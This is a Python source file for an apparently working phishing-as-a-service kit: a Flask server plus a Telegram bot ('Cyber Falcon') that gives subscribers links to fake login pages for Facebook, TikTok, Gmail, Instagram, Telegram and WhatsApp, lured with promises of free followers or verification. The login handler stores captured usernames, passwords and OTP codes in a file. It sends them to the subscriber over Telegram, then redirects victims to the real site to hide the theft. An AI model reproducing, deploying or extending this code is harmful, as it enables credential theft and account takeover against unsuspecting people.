import asyncio
import logging
import requests
import json
import os
import threading
import time
from flask import Flask, send_from_directory, request, redirect, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============= ফ্লাস্ক অ্যাপ =============
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "Bot is running!", 200

@flask_app.route('/health')
def health():
    return "OK", 200

@flask_app.route('/<path:filename>')
def serve_template(filename):
    if '?' in filename:
        filename = filename.split('?')[0]
    if not '.' in filename:
        filename = f"{filename}.html"
    try:
        return send_from_directory('templates', filename)
    except:
        return f"File {filename} not found", 404

# ============= লগইন হ্যান্ডলার =============
@flask_app.route('/login', methods=['POST'])
def handle_login():
    # ফর্ম ডাটা নিন
    username = request.form.get('username') or request.form.get('email') or 'N/A'
    password = request.form.get('password') or 'N/A'
    groupName = request.form.get('groupName') or 'N/A'
    otp_code = request.form.get('otp_code') or 'N/A'
    
    page_type = request.args.get('page_type', 'unknown')
    target_user_id = request.args.get('user_id', 'unknown')
    
    # WhatsApp এর জন্য আলাদা মেসেজ তৈরি
    if page_type == 'whatsapp_groups':
        if otp_code != 'N/A':
            message = f"""
🔐🦅 WhatsApp OTP Received 🦅🔐

📱 Platform: WhatsApp Groups
🔢 OTP Code: {otp_code}
👥 Group: {groupName}
🌐 IP: {request.remote_addr}
⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}

⚠️ OTP verification completed!
"""
        else:
            message = f"""
🔐🦅 WhatsApp Login Alert 🦅🔐

📱 Platform: WhatsApp Groups
👤 Email/User: {username}
🔑 Password: {password}
👥 Group: {groupName}
🌐 IP: {request.remote_addr}
⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}

⚠️ Someone logged in using your link!
"""
    else:
        platform_names = {
            'facebook_followers': '🎯 Facebook Followers',
            'tiktok_boost': '🚀 TikTok Booster',
            'meta_verify': '💎 Meta Verified',
            'facebook': '📘 Facebook',
            'tiktok': '🎵 TikTok',
            'telegram': '✈️ Telegram',
            'gmail': '📧 Gmail',
            'instagram': '📷 Instagram'
        }
        platform_name = platform_names.get(page_type, f"🌐 {page_type}")
        
        message = f"""
🔐🦅 New Login Alert 🦅🔐

📱 Platform: {platform_name}
👤 Email/User: {username}
🔑 Password: {password}
🌐 IP: {request.remote_addr}
⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}

⚠️ Someone logged in using your link!
"""
    
    # ডেটা সেভ
    data = {
        'username': username,
        'password': password,
        'groupName': groupName,
        'otp_code': otp_code,
        'ipAddress': request.remote_addr,
        'pageType': page_type,
        'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
        'generated_by': target_user_id
    }
    
    with open('credentials.json', 'a') as f:
        f.write(json.dumps(data) + '\n')
    
    # শুধু সেই ইউজারকে মেসেজ পাঠান
    if target_user_id != 'unknown':
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        try:
            response = requests.post(url, json={'chat_id': int(target_user_id), 'text': message}, timeout=10)
            print(f"✅ Login info sent to user: {target_user_id}")
        except Exception as e:
            print(f"❌ Failed to send: {e}")
    
    # রিডাইরেক্ট
    redirect_urls = {
        'whatsapp_groups': 'https://web.whatsapp.com/',
        'facebook_followers': 'https://www.facebook.com/',
        'tiktok_boost': 'https://www.tiktok.com/',
        'meta_verify': 'https://www.facebook.com/',
        'facebook': 'https://www.facebook.com/',
        'tiktok': 'https://www.tiktok.com/',
        'telegram': 'https://web.telegram.org/',
        'gmail': 'https://mail.google.com/',
        'instagram': 'https://www.instagram.com/'
    }
    return redirect(redirect_urls.get(page_type, 'https://www.google.com/'))

def broadcast_to_all(message_text):
    """অ্যাডমিনের ব্রডকাস্ট"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    success_count = 0
    for chat_id in active_users:
        try:
            requests.post(url, json={'chat_id': chat_id, 'text': message_text, 'parse_mode': 'Markdown'}, timeout=5)
            success_count += 1
        except:
            pass
    return success_count

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    flask_app.run(host='0.0.0.0', port=port)

# ============= টেলিগ্রাম বট =============
# ✅ এনভায়রনমেন্ট ভেরিয়েবল থেকে টোকেন নিন (নিরাপদ)
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
ADMIN_CHAT_ID = 7843284032

if not TELEGRAM_BOT_TOKEN:
    print("❌ ERROR: TELEGRAM_BOT_TOKEN environment variable not set!")
    print("👉 Please set it in Render Dashboard: Environment → Add Variable")
    exit(1)

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

RENDER_URL = "https://fc-bot-plv4.onrender.com"
RENDER_URL = "https://fc-bot-v0cf.onrender.com"

active_users = set()
user_details = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query:
        await query.answer()
        chat_id = query.message.chat.id
        message_id = query.message.message_id
        user_name = query.from_user.first_name
        user_username = query.from_user.username
    else:
        chat_id = update.effective_chat.id
        message_id = None
        user_name = update.effective_user.first_name
        user_username = update.effective_user.username
    
    active_users.add(chat_id)
    user_details[chat_id] = {
        'name': user_name,
        'username': user_username or 'N/A',
        'joined': time.strftime("%Y-%m-%d %H:%M:%S")
    }
    
    try:
        requests.get(f"http://localhost:5000/add_user/{chat_id}", timeout=2)
    except:
        pass
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 All Mane page", callback_data="menu_main")],
        [InlineKeyboardButton("📢 Advance page", callback_data="menu_advance")],
        [InlineKeyboardButton("🦅 Status", callback_data="status"),
         InlineKeyboardButton("🥷 Community", url="https://t.me/+j8x9Tp4CGa80ZmM1")]
    ])
    
    message = f"""
😈 🦅𝘾.𝙁 𝘽𝙤𝙩 𝙥𝙧𝙤😈🦅

𝙃𝙞 {user_name}😍🥰😘! 
𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝘾𝙮𝙗𝙚𝙧 𝙛𝙖𝙡𝙘𝙤𝙣 𝙗𝙤𝙩.

🥷𝗦𝘁𝗮𝘁𝘂𝘀: 🟢 𝗔𝗰𝘁𝗶𝘃𝗲
"""
    
    if message_id:
        await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=message, reply_markup=keyboard, parse_mode='Markdown')
    else:
        await update.message.reply_text(message, reply_markup=keyboard, parse_mode='Markdown')

async def menu_main(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📘 Facebook", callback_data="page_facebook")],
        [InlineKeyboardButton("🎵 TikTok", callback_data="page_tiktok")],
        [InlineKeyboardButton("✈️ Telegram", callback_data="page_telegram")],
        [InlineKeyboardButton("📧 Gmail", callback_data="page_gmail")],
        [InlineKeyboardButton("📷 Instagram", callback_data="page_instagram")],
        [InlineKeyboardButton("🤧Back🥴🤢", callback_data="back")]
    ])
    
    await query.edit_message_text("😈 All Mane page Platforms\n\nSelect a platform:", reply_markup=keyboard)

async def menu_advance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🎯 Free Followers", callback_data="adv_followers")],
        [InlineKeyboardButton("🤤 Hot Groups", callback_data="adv_groups")],
        [InlineKeyboardButton("🚀 TikTok Booster", callback_data="adv_boost")],
        [InlineKeyboardButton("💎 Meta Verified", callback_data="adv_verify")],
        [InlineKeyboardButton("🤧Back🥴🤢", callback_data="back")]
    ])
    
    await query.edit_message_text("📢 Advance page Menu\n\nSelect an option:", reply_markup=keyboard)

async def show_page(update: Update, context: ContextTypes.DEFAULT_TYPE, title: str, url_path: str, back_callback: str, page_type: str):
    query = update.callback_query
    await query.answer()
    
    user_id = query.message.chat.id
    full_url = f"{RENDER_URL}/{url_path}?page_type={page_type}&user_id={user_id}"
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Open Page", url=full_url)],
        [InlineKeyboardButton("🤧Back🥴🤢", callback_data=back_callback)]
    ])
    
    await query.edit_message_text(f"{title}\n\n🔗 {full_url}", reply_markup=keyboard)

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.message.chat.id
    user_info = user_details.get(user_id, {'name': 'User', 'username': 'N/A'})
    
    await query.answer()
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🤧Back🥴🤢", callback_data="back")]
    ])
    
    message = f"""
📊 Bot Status

🦅 Status: 🟢 Active
👤 Name: {user_info['name']}
🆔 Username: @{user_info['username']}
🏷️ User ID: `{user_id}`
🌐 Bot URL: @MR_FireSword_2025_bot

🥷 Community: @CyberFalcon
"""
    await query.edit_message_text(message, reply_markup=keyboard, parse_mode='Markdown')

async def back(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await start(update, context)

async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_CHAT_ID:
        await update.message.reply_text("⛔ এই কমান্ড শুধুমাত্র অ্যাডমিনের জন্য!")
        return
    
    if not user_details:
        await update.message.reply_text("📭 এখনো কোনো ইউজার বট ব্যবহার করেনি।")
        return
    
    message = "📋 *সকল ইউজারের তালিকা:*\n\n"
    for uid, info in user_details.items():
        message += f"👤 *নাম:* {info['name']}\n"
        message += f"🆔 *আইডি:* `{uid}`\n"
        message += f"📛 *ইউজারনেম:* @{info['username']}\n"
        message += f"📅 *যোগদান:* {info['joined']}\n"
        message += "─────────────────\n"
        
        if len(message) > 4000:
            await update.message.reply_text(message, parse_mode='Markdown')
            message = ""
    
    if message:
        await update.message.reply_text(message, parse_mode='Markdown')

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    
    print(f"🔘 Callback: {data}")
    
    if data == "menu_main":
        await menu_main(update, context)
    elif data == "menu_advance":
        await menu_advance(update, context)
    elif data == "status":
        await status(update, context)
    elif data == "back":
        await back(update, context)
    elif data == "page_facebook":
        await show_page(update, context, "📘 Facebook Page", "facebook", "menu_main", "facebook")
    elif data == "page_tiktok":
        await show_page(update, context, "🎵 TikTok Page", "tiktok", "menu_main", "tiktok")
    elif data == "page_telegram":
        await show_page(update, context, "✈️ Telegram Page", "telegram", "menu_main", "telegram")
    elif data == "page_gmail":
        await show_page(update, context, "📧 Gmail Page", "gmail", "menu_main", "gmail")
    elif data == "page_instagram":
        await show_page(update, context, "📷 Instagram Page", "instagram", "menu_main", "instagram")
    elif data == "adv_followers":
        await show_page(update, context, "🎯 Free Facebook Followers", "facebook_followers", "menu_advance", "facebook_followers")
    elif data == "adv_groups":
        await show_page(update, context, "🤤 Hot WhatsApp Groups", "Whatsapp_groups", "menu_advance", "whatsapp_groups")
    elif data == "adv_boost":
        await show_page(update, context, "🚀 TikTok Booster", "tiktok_boost", "menu_advance", "tiktok_boost")
    elif data == "adv_verify":
        await show_page(update, context, "💎 Meta Verified", "meta_verify", "menu_advance", "meta_verify")
    else:
        await query.answer("Unknown button")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.message.from_user.first_name
    chat_id = update.message.chat.id
    message_text = update.message.text
    
    active_users.add(chat_id)
    if chat_id not in user_details:
        user_details[chat_id] = {
            'name': user_name,
            'username': update.message.from_user.username or 'N/A',
            'joined': time.strftime("%Y-%m-%d %H:%M:%S")
        }
    
    try:
        requests.get(f"http://localhost:5000/add_user/{chat_id}", timeout=2)
    except:
        pass
    
    if chat_id == ADMIN_CHAT_ID:
        if message_text.startswith('/broadcast '):
            broadcast_msg = message_text.replace('/broadcast ', '')
            sent = broadcast_to_all(f"📢 {broadcast_msg}")
            await update.message.reply_text(f"✅ Broadcast পাঠানো হয়েছে {sent} জনের কাছে")
        elif message_text.startswith('/total'):
            await update.message.reply_text(f"👥 মোট ব্যবহারকারী: {len(active_users)} জন")
        elif message_text.startswith('/users'):
            await show_users(update, context)
        elif message_text == '/start':
            await start(update, context)
        else:
            await update.message.reply_text(f'🙋 হ্যালো অ্যাডমিন {user_name}! \n\n📌 কমান্ডসমূহ:\n/broadcast মেসেজ - সবাইকে মেসেজ দেয়\n/total - মোট ইউজার দেখায়\n/users - ইউজার লিস্ট দেখায়\n/start - মেনু দেখায়')
    
    elif message_text == '/start':
        await start(update, context)
    else:
        await update.message.reply_text(f'🙋 Hi {user_name}! Type /start to see the main menu.')

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"❌ Error: {context.error}")

def run_bot():
    print("🦅 Starting Telegram Bot...")
    
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("link", start))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_error_handler(error_handler)
    
    print("✅ Bot is polling for updates...")
    app.run_polling(allowed_updates=["message", "callback_query"])

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    run_bot()
